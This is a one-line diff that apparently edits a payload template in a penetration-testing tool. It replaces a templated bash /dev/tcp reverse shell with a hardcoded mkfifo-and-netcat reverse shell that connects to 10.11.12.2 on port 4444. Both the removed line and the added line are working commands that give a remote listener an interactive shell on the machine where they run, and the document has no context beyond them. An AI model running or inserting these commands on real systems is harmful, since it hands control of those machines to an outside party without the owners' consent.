@@ -1,1 +1,1 @@
-bash -c "bash &>/dev/tcp/{{datastore.lhost}}/{{datastore.lport}} <&1" 2>&1
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.12.2 4444 >/tmp/f
